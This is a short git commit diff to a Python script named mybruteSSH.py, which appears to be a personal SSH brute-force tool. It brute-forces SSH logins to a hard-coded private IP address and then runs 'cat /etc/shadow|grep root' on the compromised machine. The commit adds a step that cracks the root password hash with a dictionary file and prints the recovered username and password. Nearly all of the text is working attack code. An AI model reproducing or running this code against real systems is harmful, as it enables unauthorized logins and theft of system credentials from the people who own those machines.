057f20201f551d031d8fe758ee867620e467dbf3
riverchu <churiver@protonmail.com>
2018-05-28 13:13:23 -0400

    record

--- mybruteSSH.py
+++ mybruteSSH.py
@@ -5,7 +5,7 @@ __author__="riverchu"
 import optparse
 
 from scan import *
-from brute import bruteSSH,loginSSH
+from brute import bruteSSH,loginSSH,bruteUnixPasswd
 
 def brute(host,user,dictionary,*,connections):
     target=(host,user)
@@ -28,7 +28,9 @@ def main(host,user,dictionary,*,connections=10):
     info = brute(host,user,dictionary,connections=connections)
     handle = login(info)
     ret = loginSSH.send_command(handle,'cat /etc/shadow|grep root')
-    print(ret)
+    passwdInfo = bruteUnixPasswd.crack_unix_passwd(ret,dic='./data/dictionary.txt')
+    print('user:',passwdInfo[0])
+    print('password:',passwdInfo[1])
 
 if __name__=="__main__":
     host = '10.108.36.71'
